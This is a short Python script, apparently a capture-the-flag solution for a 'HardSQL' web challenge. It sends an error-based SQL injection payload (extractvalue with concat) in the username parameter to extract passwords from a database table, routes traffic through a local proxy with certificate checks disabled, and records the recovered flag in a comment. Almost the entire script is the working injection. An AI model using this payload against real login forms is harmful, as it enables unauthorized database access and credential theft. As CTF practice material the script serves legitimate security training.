#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2026/9/1 14:12
# @Author  : tushanfirm
# @File    : HardSQL_2019.py
# @Software: PyCharm
import requests
import urllib3

urllib3.disable_warnings()  # 可选：屏蔽 InsecureRequestWarning 刷屏警告
proxys = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
url = 'https://cde854bf75cb3c3ac2ccc61a.http-ctf2.dasctf.com/check.php'
payload = {
    'username': 'admin\'^extractvalue(1,left(concat(0x7e,(select(password)from(H4rDsq1))),30))#',
    'password': 'password'
}
res = requests.get(url, params=payload, verify=False, proxies=proxys).text
print(res)
# flagCTF2{202ce9fd-1326-4d45-96fb-8385766eff04}